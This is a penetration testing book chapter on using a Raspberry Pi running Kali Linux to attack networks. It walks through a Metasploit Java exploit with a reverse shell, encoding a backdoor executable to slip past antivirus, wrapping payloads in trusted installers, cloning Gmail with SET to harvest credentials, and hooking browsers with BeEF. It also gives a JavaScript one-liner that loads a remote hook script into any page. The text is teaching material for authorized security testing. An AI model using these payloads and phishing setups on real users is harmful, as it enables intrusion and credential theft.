- en: Chapter 4. Raspberry Pi Attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous chapters, we learned how to set up a Raspberry Pi for penetration
    testing. The steps included installing Kali Linux, establishing access to a target
    network, and performing basic reconnaissance. In this chapter, we will focus on
    attacking targets once your Raspberry Pi has established a foothold on a network.
    The topics include compromising systems, setting up social engineering attacks,
    exploiting Internet browsers, and developing a rogue access using tools that are
    available in Kali Linux. Some of the tools that will be covered are preinstalled
    on the Kali Linux ARM image; however, we recommend that you use the `apt-get`
    command to download the newest versions as well as update them regularly.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting a target
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Metasploit
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Social engineering
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The Social-Engineer Toolkit
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Phishing with BeEF
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Rogue access honeypots
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Easy-creds
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The Raspberry Pi has limited performance capabilities due to its size and processing
    power. Therefore, it is highly recommended that you test the following techniques
    in a lab prior to using a Raspberry Pi for a live penetration test.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting a target
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Exploiting a system means taking advantage of a bug, glitch, or vulnerability
    in the system and causing unintended behavior of the system. Typically, the unintended
    behavior is permitting an attacker to gain access to a system or being taken through
    a denial-of-service technique. With regards to a Raspberry Pi that is sitting
    on a target network, the goal is to leverage the Raspberry Pi as an insider that
    will be used to attack local systems. This way, perimeter defenses will not be
    able to detect the attack unless they have visibility into the same network segment
    using behavior analytics or a **Switch Port Analyzer** (**SPAN**) tap that is
    monitored by an IPS/IDS. We find that many administrators place their best security
    defenses on the edge of their network, making them blind to host-to-host communication.
    This is the ideal situation for placing a Raspberry Pi on such a network and controlling
    it using a remote connection from anywhere in the world. You will see diagrams
    of this attack model in many sections of this chapter.
  prefs: []
  type: TYPE_NORMAL
- en: A full-blown installation of Kali Linux has a ton of applications that are available
    to exploit systems; however, many of these tools do not come preinstalled on the
    Kali Linux ARM image. You can install most of the missing tools using the `apt-get`
    command, but some won't function properly or will render the Raspberry Pi useless
    by consuming too much processing power. For this reason, we have designed this
    chapter around very specific attacks that are customized for a Raspberry Pi.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s start off by building an attack using the most popular exploit framework:
    Metasploit.'
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The Metasploit Project is seen by many as the de facto standard for executing
    exploit code against a target machine. The Metasploit Framework contains hundreds
    of working exploits for a variety of platforms. Attackers can include payloads,
    encoders, and **no-operation** (**NOP**) slide generators with an exploit module
    to solve almost any exploit-related attack. The key to Metasploit's popularity
    is that it has weaponized complex attacks in a scripted format so that the average
    user can launch sophisticated attacks in minutes. You can learn more about Metasploit
    at [www.metasploit.com](http://www.metasploit.com).
  prefs: []
  type: TYPE_NORMAL
- en: 'The Metasploit Framework has many different tools that can be used to exploit
    systems. The available tools are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Msfcli**: This is a command-line interface to the framework that allows a
    user to launch exploits or attacks through scripts.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Msfconsole**: This is the most popular way to access Metasploit. Msfconsole
    provides access to the entire framework through a series of context-driven command
    prompts.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Exploits**: Exploits will compromise a victim machine and they can be broken
    down into active and passive exploits. Active exploits run until shell access
    is achieved or the exploit is stopped because of some sort of exception error.
    In the following screenshot, we show an active exploit as the attacker executes
    the attack until they have access to the victim''s machine through a shell:![Metasploit](img/Insert6435OT_04_01.jpg)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Passive exploits on the other hand wait until a victim machine connects to Metasploit
    and then Metasploit runs the attack. The difference between active and passive
    exploits is that Metasploit will initiate a connection in an active exploit while
    it will wait for the victim in a passive attack.
  prefs: []
  type: TYPE_NORMAL
- en: '**Payloads**: Metasploit allows attackers to use single stagers and stages
    as payloads. The description of these and when to use them can get complicated
    and is out of scope for a Raspberry Pi-based book. We suggest you look for more
    information at the Metasploit Unleashed home page that is referenced at the end
    of this section in the tip.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Database**: Metasploit has built-in support for the PostgreSQL database system.
    This database system allows attackers to keep track of hosts, networks, and vulnerabilities.
    One of the main purposes of using the built-in database in Metasploit is to keep
    track of what you discover and help with documentation for future attacks and
    reporting.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Meterpreter**: This is one of the most powerful resources in Metasploit.
    It is dynamic in regards to memory payload. Depending on the exploited system,
    the nature of the vulnerability, and how it was run, Meterpreter can provide attackers
    full shell features and remote control of a victim machine.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: There are many great books and resources that are available to learn Metasploit.
    One suggestion is the free Offensive Security introduction of Metasploit Unleashed
    at [http://www.offensive-security.com/metasploit-unleashed/Main_Page](http://www.offensive-security.com/metasploit-unleashed/Main_Page).
  prefs: []
  type: TYPE_NORMAL
- en: 'With regards to a Raspberry Pi, some of the Metasploit modules do not function
    properly when run from the Kali Linux ARM image. For this reason, we suggest that
    you only launch very specific attacks. For our example, we will assume that the
    Raspberry Pi has access to the inside network and you would like to identify a
    target to breach. The steps to exploit a local system are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: Identify a target using Nmap to scan the network.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Scan the target for possible vulnerabilities using Nmap.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Search Metasploit for attacks that match the vulnerabilities identified during
    the Nmap scan.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Launch an attack against a vulnerability.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If you are successful, you will obtain access to the system.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following diagram represents how this attack would look on a target network:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/Insert6435OT_04_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let's walk through using Metasploit to compromise a system on the local network.
  prefs: []
  type: TYPE_NORMAL
- en: To launch Metasploit, from a command-line window, type the `msfconsole` command.
    It can take Metasploit a few minutes to launch on Raspberry Pi.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot shows the launch of Metasploit on Raspberry Pi:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/Insert6435OT_04_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Once you are in Metasploit using `msfconsole`, you will see a new command prompt.
    Let's use an exploit against a target. In this example, we will demo a Java exploit.
    To accomplish this, type the `use exploit/multi/browser/java_jre17_ exec` command.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot shows the launch of the preceding command:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/Insert6435OT_04_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: This will change your prompt to `msf exploit`. Next, we will deliver a payload
    with Metasploit that will spawn a reverse shell. A **reserve shell** is a command
    prompt that an attacker accesses locally from their PC that has been used for
    the attack while running commands on a remote victim's target system. We will
    use the `set PAYLOAD java/ shell/reverse_tcp` command to set the payload. You
    will see the **PAYLOAD =>** shell with your setting, which will confirm that it
    has been accepted.
  prefs: []
  type: TYPE_NORMAL
- en: In order for the attack to work, the attacker must set up options in the payload.
    You can view the available options by typing the `show options` command. Some
    options are required while others are not, depending on how they are labeled when
    you use the `show options` command. This particular payload only requires one
    option, which is the `LHOST` option. `LHOST` is the attacker's local IP address.
    This tells Metasploit, when the payload has been delivered to the victim, how
    the victim will connect back to the attacker. You will need to ensure that the
    IP address of the attacker's machine (`LHOST`) is reachable by the victim's machine
    in order to establish a connection once this attack is executed successfully.
  prefs: []
  type: TYPE_NORMAL
- en: 'To configure the `LHOST` option, type `set LHOST IP_Address_of_Kali`, where
    the address of Kali is the IP address of the Raspberry Pi hosting Kali Linux.
    You can verify the change by using the `show options` command and see that the
    `LHOST` name now has a value. The following screenshot shows the setting of the
    `LHOST` name to `192.168.1.10`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/Insert6435OT_04_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Type the `exploit` command to execute the payload with your options.
  prefs: []
  type: TYPE_NORMAL
- en: If your victim is running an exploitable version of Java, you will get a reverse
    shell to the victim machine. To test the exploit, go to the victim machine, open
    up a web browser, and browse the machine hosting Kali Linux. For our example,
    this would be `192.168.1.10`.
  prefs: []
  type: TYPE_NORMAL
- en: Normally, a victim would not knowingly browse an attacker's machine; however,
    this is a good way to test whether your exploit works in a lab environment. Real-world
    attackers will place a link in a sophisticated web page, such as in an iFrame
    hidden in an innocent looking web page. There are many other attacks that can
    take advantage of remote exploits so that the attackers can launch a payload as
    well.
  prefs: []
  type: TYPE_NORMAL
- en: Once the victim browses the attacker's machine running the exploit, the payload
    will be loaded and the victim will be exploited, giving the attacker shell (command
    line) access to the victim's machine.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can test this attack by installing an older exploitable version of Java
    on a test victim machine. Java 1.0.7_6 is a possible option to use for testing.
    You can find older versions of Java on Oracle's website at [http://www.oracle.com/technetwork/java/archive-139210.html](http://www.oracle.com/technetwork/java/archive-139210.html).
  prefs: []
  type: TYPE_NORMAL
- en: Creating your own payloads with Metasploit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Another popular way to use Metasploit is to create malicious payloads. Payloads
    in computing terms mean a data transmission. When we refer to a malicious payload,
    we are talking about adding something unwanted by the victim to the data transfer
    such as a backdoor. Metasploit offers tons of payload options that can provide
    root access to systems once they are installed.
  prefs: []
  type: TYPE_NORMAL
- en: Most security solutions such as anti-virus or IPS are designed to detect payloads.
    However, Metasploit includes encoders to bypass these traditional defenses. Encoding
    means to add random data to the file so that it looks different than what it really
    is. Most traditional security defenses leverage lists of known threats that are
    also known as signatures, which means that if a threat is not on that list, it
    is not detected. Encoding provides a way to make a payload look unique enough
    to not trigger a known signature and beat traditional defenses. Some people call
    this a "day zero" threat, meaning none of the commercial vendors have a signature
    for the threat to detect it.
  prefs: []
  type: TYPE_NORMAL
- en: For the next attack, we will create a payload, encode it so that it bypasses
    traditional security defenses, and place it on a target system. Payloads can be
    delivered through e-mail or USB, or if an exploit is successful enough to get
    basic system access, the payload can be placed on the target system to escalate
    the attacker's level of access rights on that system.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The best practice is to create payloads in a more powerful system and transport
    them through the Raspberry Pi rather than creating them directly in the Raspberry
    Pi.
  prefs: []
  type: TYPE_NORMAL
- en: Let's look at how to develop a payload and encode it with Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: The first step is to open Metasploit and type `msfconsole` in the command terminal.
    After a minute or so, you will see the Metasploit introduction page.
  prefs: []
  type: TYPE_NORMAL
- en: 'You can generate payloads by accessing the `msfpayload` subsection. Payload
    options can be seen using the `msfpayload –h` command to view available formats
    and the `msfpayload –l` command to see the actual payload options. For our example,
    we''ve pulled up one of the most popular exploits, known as the `reverse_tcp`
    payload, which is used to exploit a Windows system. The following screenshot demonstrates
    selecting this payload and configuring the listening address, which is our system''s
    IP address to listen on port `4444`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Metasploit can produce different file formats for an exploit. In our example,
    we will create an executable file called `important.exe` so that the victim believes
    it to be an important update. Note that this is where social engineering comes
    into play, meaning you can name this executable file something the user expects
    to install and include it with a social engineering campaign. To create the `important.exe`
    file, use the `X > important.exe` command after the original payload. The following
    screenshot shows the creation of this file:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'After creating the file, you can find the file in your `root` folder. The hard
    part is coming up with a clever method to get a victim to install the file. If
    you can convince a Windows user to install it, you will be granted a backdoor
    with root access to that system, assuming everything functions as expected. This
    concept can be useful for other attack examples presented later in this chapter.
    The following screenshot shows our `important.exe` file on a target computer:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Wrapping payloads
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Another method to hide a payload is wrapping it with a trusted application.
    For example, you can inform a victim that their Adobe Reader is out of date and
    wrap the proper upgrade file with a backdoor. When the victim installs the `.exe`
    file, they will get the update and an unwanted backdoor.
  prefs: []
  type: TYPE_NORMAL
- en: This can be a very effective way to complement a targeted social engineering
    attack. We will refer to this approach in the *Phishing with BeEF* section later
    in this chapter, where we will have a popup that will trick a user to click and
    download a wrapped payload.
  prefs: []
  type: TYPE_NORMAL
- en: Wrapping payloads is out of scope for a Raspberry Pi penetration testing book.
    There are tools available such as Senna that are designed for this purpose. The
    following screenshot shows the **Senna Spy One** dashboard wrapping a **ROOTKIT**
    payload with the Windows calculator executable file. When a user runs the file,
    the calculator will pop up and the **ROOTKIT** payload will be installed. You
    can learn more about wrapping payloads by researching Senna or other wrapper tools.
  prefs: []
  type: TYPE_NORMAL
- en: '![Wrapping payloads](img/Insert6435OT_04_9.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Social engineering
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Social engineering attacks are designed to trick a victim into providing information
    through misdirection or deceit. Attackers often pretend to be someone they are
    not, such as someone with authority or a family member, to gain a victim's trust.
    When they are successful, users might have given up passwords, access credentials,
    or other valuable secrets. There are stories about famous hackers who have been
    able to obtain intellectual property just by asking for it with a smile.
  prefs: []
  type: TYPE_NORMAL
- en: There are many tools that are available in Kali Linux to assist with a social
    engineering campaign; however, the most successful attacks are based on understanding
    your target audience and abusing their trust. For example, we have obtained sensitive
    information using fake accounts on social media sources such as LinkedIn and Facebook,
    which didn't require any advanced techniques to accomplish most of our goals.
    Other examples include calling somebody while pretending that you are an administrator
    or sending e-mails claiming to be a long-lost family member.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can learn more about the authors' research on executing a penetration test
    using social media by searching for "Emily Williams Social Engineering" on Google
    or at [http://www.thesecurityblogger.com/?p=1903](http://www.thesecurityblogger.com/?p=1903)
    and [http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html](http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html).
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we focus on one of the most popular social engineering attack
    tools known as SET. SET can be launched from a Raspberry Pi, but it will probably
    function better from a more powerful system. The best practice is leveraging a
    Raspberry Pi for on-site reconnaissance that can be used to build a successful
    social engineering attack that is executed from a remote web server.
  prefs: []
  type: TYPE_NORMAL
- en: We will follow the discussion of SET with another popular social engineering
    tool that is used to exploit browsers. This is known as BeEF.
  prefs: []
  type: TYPE_NORMAL
- en: The Social-Engineer Toolkit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The **Social-Engineer Toolkit** (**SET**) was developed by David Kennedy at
    TrustSec and it comes preinstalled with Kali Linux. It is often used to duplicate
    trusted websites such as Google, Facebook, and Twitter with the purpose of attracting
    victims to launch attacks against them. As victims unknowingly browse these duplicate
    websites, attackers can gather the victims' passwords or possibly inject a command
    shell that gives them full access to the victims' systems. It is a great tool
    for security professionals to demonstrate the chain of trust as a vulnerability,
    meaning demoing how the average person will not pay attention to the location
    where they enter sensitive information as long as the source looks legit.
  prefs: []
  type: TYPE_NORMAL
- en: You can run SET from a Raspberry Pi; however, the victim's experience of the
    Internet speed will be limited to the throughput provided by the Raspberry Pi.
    We found in our testing that victims sometimes experienced long delays before
    being redirected to the real website, which alerted them to a possible attack.
    For this reason, we recommend that you target your SET attacks to a specific user
    rather than a blank audience when using a Raspberry Pi to keep the performance
    good.
  prefs: []
  type: TYPE_NORMAL
- en: In the following example, we will set up a Raspberry Pi to clone Gmail. As shown
    in the following image, the goal is to make a victim believe that they are accessing
    their Gmail account and redirect them to the real Gmail website after they log
    in but store their login credentials. The trick will be to get the victim to access
    the SET server; however, that's where your social engineering abilities come into
    play. For example, you could e-mail a link, post the link on a social media source,
    or poison the DNS to direct traffic to your attack server. The attacker can remotely
    access the Raspberry Pi to pull down stolen credentials for a final penetration
    testing report.
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let's take a look at how to use SET on a Raspberry Pi.
  prefs: []
  type: TYPE_NORMAL
- en: 'To launch SET, type `setoolkit` in a command prompt window. You will be prompted
    to enable **bleeding-edge repos**. Bleeding-edge repos are a new feature in Kali
    that includes daily builds on popular tools such as SET. The best practice is
    to enable the bleeding-edge repos and test your exercise prior to using it in
    a live penetration test as things can slightly change. The following screenshot
    shows how to enable **bleeding-edge repos**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Bleeding-edge repos are a great way to get the latest software packages on popular
    tools. However, seasoned security professionals will find that these tools often
    change and the features can no longer be used. The best practice is to disable
    updates prior to going live with a tool unless you have time to test updates from
    new releases.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once SET is launched, you will need to agree to the license and terms of the
    software program by typing **yes**. At this point, you will see the main menu
    of SET, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: SET is a menu-based attack tool. Unlike other tools, it does not use the command
    line. This is based around the concept that social engineering attacks are polymorphic
    in nature and require multiple linear steps to set up. A command-line tool can
    cause confusion when developing these types of attacks.
  prefs: []
  type: TYPE_NORMAL
- en: For this example, we will select **1) Social - Engineering Attacks**.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot shows the menu under **Social – Engineering Attacks**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Next, we will select **2) Website Attack Vectors**. This will bring up a variety
    of different options. In this test scenario, we will perform a simple credential
    harvester attack, which is **3) Credential Harvester Attack Method,** as shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: When you select the **Credential Harvester Attack Method** option, you have
    the option of using a pre-existing template or cloning a website. We found that
    most templates don't work that well against the average person, so it is best
    to clone a real website. In addition, websites often change, so cloning a website
    will give you the latest version that your victim will expect to see.
  prefs: []
  type: TYPE_NORMAL
- en: When you select the appropriate option, you will be prompted to enter the IP
    address of the interface that SET should listen on. If you have multiple interfaces,
    you should enter the IP address of your Internet-facing interface or the victims
    might have problems accessing your Raspberry Pi attack server.
  prefs: []
  type: TYPE_NORMAL
- en: If you selected **2) Site Cloner** under **Credential Harvester Attack Method**,
    you will need to enter the full URL of the site that you want to clone such as
    [https://www.facebook.com](https://www.facebook.com). If you select a website
    template, you will be choosing an existing template from a provided list. The
    following screenshot shows an example of some available templates. Note that these
    templates are very basic and dated, meaning they will probably not look like the
    real thing. This is why you should clone a site when performing a real penetration
    test.
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The menu in the following screenshot offers several types of attacks. We recommend
    that you test each of these and make a selection based on your personal preference
    and success rate. Some of these attacks require a man-in-the-middle setup, which
    was discussed in the *Man-in-the-middle attacks* section of [Chapter 3](ch03.html
    "Chapter 3. Penetration Testing"), *Penetration Testing*.
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'For our example, we will select **3) Credential Harvester Attack Method**.
    This attack hosts a fake website and waits for victims to log in. When a victim
    sees the login and enters their login credentials, they will be redirected to
    the real website while unknowingly having their credentials captured for the attacker
    to use at a later time. The following example shows what the cloned Google login
    screen looks like:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_17.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The difficult part of this attack is tricking the victim into believing that
    they are going to the real web page. This can be accomplished by sending them
    an e-mail with a fake link, posting a link on a social media website, performing
    DNS poisoning, and so on. SET has a number of tools and utilities to make this
    easier, but these are out of scope for a Raspberry Pi book. Check out SET's website
    found at [https://www.trustedsec.com/social-engineer-toolkit/](https://www.trustedsec.com/social-engineer-toolkit/)
    for more information on these tools.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The best practice is to launch SET attacks from a remote server rather than
    the Raspberry Pi due to the process requirements to execute these types of attacks.
    From a user viewpoint, the attack will look the same if it is locally hosted on
    a Raspberry Pi or from an external system since our example is cloning a cloud
    service.
  prefs: []
  type: TYPE_NORMAL
- en: Phishing with BeEF
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The **Browser Exploitation Framework** (**BeEF**) is another tool that is often
    categorized under exploit penetration testing, honeypot, and social engineering.
    BeEF is used to host a malicious web server such as SET. However, BeEF leverages
    weaknesses found in Internet browsers for its attack. When a victim connects to
    a BeEF server, BeEF will hook the system and examine how exploitable the victim's
    web browser is to various attacks. Based on these findings, BeEF will offer a
    range of command modules that can be launched, such as taking screenshots or triggering
    a beep sound. Hooked systems can only be accessed while they are online. However,
    once hooked, BeEF can track when a system establishes Internet connectivity to
    continue launching commands against that system. You can find more on BeEF at
    [http://beefproject.com/](http://beefproject.com/).
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The authors have used BeEF for authorized penetration testing since it doesn't
    require modifying the endpoint systems to be successful. This means that there
    is less risk of upsetting clients and less cleanup after the penetration test.
  prefs: []
  type: TYPE_NORMAL
- en: For this use case, we will perform an attack similar to the one we did with
    SET; however, this attack will target a victim's browser rather than tricking
    them to log into a website. This means we will once again need to clone a known
    website or develop a template that will be believable so that victims don't realize
    that they are being attacked. The biggest benefit of using BeEF is that we just
    need a victim to access the website one time to get them hooked. Once hooked,
    we can attack them even if they leave the website or go offline and come back
    online at another time.
  prefs: []
  type: TYPE_NORMAL
- en: We found that using simple social engineering tactics such as developing a fake
    holiday e-card and posting it on social media sources, or sending a link to the
    attack server through e-mail, were very effective methods to get a victim to access
    our BeEF server. A very basic, yet believable, holiday card is easy to put together
    by just gathering a few images and stating the occasion in bold font.
  prefs: []
  type: TYPE_NORMAL
- en: The following diagram represents running a BeEF server from a Raspberry Pi on
    the internal network with the goal of hooking local systems. To get users to access
    the BeEF server, the example shows an attacker sending an e-mail that includes
    a link to a **Fake Holiday Card** hosted on a BeEF hook server. Once the victim
    clicks on the link, they will see the holiday card and be hooked by BeEF. The
    attacker can remotely execute command modules from the Raspberry Pi while the
    hooked victim continues to use the Internet.
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_18.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let's walk through building this attack scenario.
  prefs: []
  type: TYPE_NORMAL
- en: 'To start BeEF, navigate to the BeEF directory using `cd /usr/share/beef-xss`
    and then run the `beef` script as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_19.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the BeEF script is running, you can access the web-based BeEF control
    panel by opening a web browser and pointing it to `http://ip_address_of_raspberry_pi_kali:3000/ui/panel`.
    The following screenshot shows the main login page of BeEF:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_20.jpg)'
  prefs: []
  type: TYPE_IMG
- en: You can log in by using the **Username** `beef` and the **Password** `beef`.
  prefs: []
  type: TYPE_NORMAL
- en: Like other social engineering attacks, you will need to trick your victim into
    going to a hook page. BeEF comes with some basic demo hook pages; however, like
    SET, these pages are pretty basic and probably won't fool the average user. You
    can test BeEF by going to `http://ip_address_of_raspberry_pi_kali:3000/demos/butcher/index.html`
    to see a basic hook page.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In the real world, you will need to edit the demo page to make it look like
    something believable. Your users do not need to stay on the page to be hooked;
    however, if it looks suspicious, they may report it. You can also add a JavaScript
    template with a tab hijacking technique to it.
  prefs: []
  type: TYPE_NORMAL
- en: Once a system is hooked, the attacker will see the victim's browser in the control
    panel and they can send a variety of different commands. In some cases, you might
    be able to send the user a more complex and valuable exploit. In other cases,
    you might be able to just retrieve basic information from the client. The available
    commands depend upon the type of web browser used by the victim as well as how
    up to date that web browser is with security patches.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot shows one Linux-based system that has been hooked:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The module tree shows possible exploits that are available to run against the
    hooked victim.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: BeEF includes a risk level for each command that defines the likelihood of the
    command working as well as the risk of alarming the victim of malicious behavior.
    It is highly recommended that you test the exploits in a lab environment against
    a system similar to a hooked target prior to using them during a live penetration
    test. We found during our testing that many exploits don't work as advertised
    on live systems.
  prefs: []
  type: TYPE_NORMAL
- en: An example of levering commands on an exploitable browser is to send out a JavaScript
    template to trick a user into clicking on something. So, for the following example,
    we will send the old school Clippy pop up asking the user to upgrade their browser.
    We will include a link that has a matching browser installation file that has
    been wrapped with a backdoor application. The topic of creating payloads, encoding
    them to bypass security defenses, and wrapping payloads with trusted executable
    files was covered earlier in this chapter under the *Metasploit* section.
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The first step to launch this attack is to go to the **Commands** tab in the
    BeEF admin console:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_23.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'From there, click on the **Social Engineering** folder and find the **Clippy**
    attack:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: You will notice that the default settings for the **Clippy** attack are built-in.
    Basically, it will download a JavaScript template that includes an image file
    of **Clippy** hosted on an internal site. It will also download and run an EXE
    file. In the following example, it downloads and runs `putty.exe`. Note that executable
    code link shown in the following screenshot is longer than the display window.
    This can be anything you desire for your attack.
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_25.jpg)'
  prefs: []
  type: TYPE_IMG
- en: You can have **Clippy** display a message before and after the download. The
    default settings display the message **Your browser appears to be out of date.
    Would you like to upgrade it?** before the download and displays **Thanks for
    upgrading your browser! Look forward to a safer, faster web!** after the download.
  prefs: []
  type: TYPE_NORMAL
- en: 'This attack is browser-based. So, unlike the original **Clippy** that appeared
    in earlier versions of Microsoft Word, this attack works regardless of the operating
    system. It works on any browser that supports JavaScript. In the following screenshot,
    we show the attack on a Mac OS X computer that doesn''t have the proper version
    of Microsoft Office:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Phishing with BeEF](img/Insert6435OT_04_26.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We are often asked how one can "hook" a victim browser without the obvious
    demo pages that ship with BeEF. The following JavaScript command can be used on
    any web page to hook a browser:'
  prefs: []
  type: TYPE_NORMAL
- en: '`%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f192.168.135.129:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();`'
  prefs: []
  type: TYPE_NORMAL
- en: You will still need to be creative in how you want to run the JavaScript command.
    It can run automatically, embedded in an ad, or any other creative way. Simply
    replace the IP address variable in the JavaScript command with your BeEF server.
    You must have noticed that the IP address of our server was `192.168.135.129`
    in the previous example. You will need to replace this with the IP address of
    your BeEF server. Ensure that your BeEF server is reachable by the victim machine
    or this attack won't work.
  prefs: []
  type: TYPE_NORMAL
- en: Rogue access honeypots
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: A honeypot in computer terminology is a trap designed to detect, deflect, or
    mislead the attempts to compromise a computer system or network. The typical honeypot
    is a computer, piece of data, or network segment that appears to be part of the
